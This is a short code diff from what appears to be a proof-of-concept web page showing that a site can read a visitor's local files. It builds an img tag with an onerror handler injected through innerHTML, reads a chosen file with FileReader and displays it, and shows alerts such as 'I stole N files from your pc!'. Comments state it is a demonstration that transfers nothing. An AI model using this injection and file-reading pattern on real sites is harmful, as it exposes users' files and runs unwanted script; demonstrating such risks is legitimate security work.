@@ -25,12 +25,13 @@
 		var temp="\" window.dataLayer = window.dataLayer || [];  function gtag(){dataLayer.push(arguments);}  gtag('js', new Date());  gtag('config', 'UA-170959658-1');\"";
 		var temp2="<img src=x onerror="+temp+">";
 		qmsg.innerHTML = temp2;
-            alert('I stole ' + this.files.length + ' files from your pc!');//This is for PoC only. A real attack would not let the user know what happened.
+            alert('UwU What is this?...');//This is for PoC only. A real attack would not let the user know what happened.
 			r.onload=function(){
 				alert(r.result); // This displays the contents of the file, which proves the website can read your harddrive.
 			};
 		
 			r.readAsText(thing.files[0]); // Display 1 file as proof.
+            alert('I stole ' + this.files.length + ' files from your pc!');//No files are actually transfered.
         };
 		
         //This is where we detect if the user is holding the Enter button.
